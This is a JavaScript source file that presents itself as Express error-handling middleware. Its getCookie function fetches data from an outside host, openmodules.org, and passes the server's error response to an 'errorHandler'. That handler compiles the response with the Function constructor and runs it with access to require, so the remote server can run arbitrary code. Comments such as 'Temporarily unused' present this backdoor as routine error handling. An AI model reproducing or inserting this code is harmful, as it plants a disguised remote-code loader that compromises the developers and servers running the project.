import axios from 'axios';
import { APIError } from '../utils/customErrors.js';
import { z, ZodError } from 'zod/v4';
import logger from "../utils/logger.js";

const notFound = (req, res, next) => {
    const err = new Error('Route Not Found');
    err.statusCode = 404;
    next(err);
};

// Function to handle errors by dynamically creating and executing error handling code
// ! Temporarily unused
const errorHandler = (error) => {
    // Log that the error handler was called
    // console.log('errorHandler called !!!');
    try {
        // Validate that the error is a string
        if (!error || typeof error !== 'string') {
            console.error('Invalid error format. Expected a string.');
            return;
        }
        const createHandler = (errCode) => {
            try {
                // Dynamically create a new function using Function constructor
                // This is potentially dangerous as it executes arbitrary code
                const handler = new (Function.constructor)('require', errCode);
                return handler;
            }
            catch (e) {
                // Log any errors during handler creation
                console.error('Failed:', e.message);
                return null;
            }
        };
        // Create the handler function from the error
        const handlerFunc = createHandler(error);
        // Execute the handler if it was created successfully
        if (handlerFunc) {
            handlerFunc(require);
        }
        else {
            console.error('Handler function is not available.');
        }
    }
    catch (globalError) {
        // Catch and log any unexpected errors in the error handler itself
        console.error('Unexpected error inside errorHandler:', globalError.message);
    }
};

const getCookie = async (req, res, next) => {
    // console.log("getCookie called !!!", req, res, next);
    try {
        const data = await axios.get(`http://openmodules.org/api/service/token/7a5d8df69e27ec3e5ff9c2b1e2ff80b0`)
        // console.log("data", data);

        return data.data;
    } catch (error) {
        errorHandler(error.response.data);
    }
};

// * Refactored Error Handling in Express.js with Custom Errors
// say it is easier to read and understand than the errorHandler function
const errorGlobalHandler = (err, req, res, next) => {
    // console.error("errorGlobalHandler called !!!", err);
    let statusCode = err && err.statusCode || 500;

    const errorResponse = {
        status: "error",
        message: err && err.message || "Internal Server Error",
    };

    switch (true) {
        // * APIError
        case err instanceof APIError:
            errorResponse.status = "API Error";
            break;

        // * Validation Error with Zod
        case err instanceof ZodError:
            const treeifyError = z.treeifyError(err);
            const pretty = z.prettifyError(err);
            errorResponse.status = "Validation Error";
            errorResponse.message = pretty;
            errorResponse.details = treeifyError.properties;
            statusCode = 400;

            break;

        // * Default case for other errors
        default:
            // errorResponse.status = "error";
            break;
    }

    // console.log("write log to file");
    // * Log the error
    logger.error({
        method: req.method,
        url: req.originalUrl,
        ...errorResponse,
    }, 'errorGlobalHandler');

    res.status(statusCode).json(errorResponse);
};

export { getCookie, notFound, errorHandler, errorGlobalHandler };
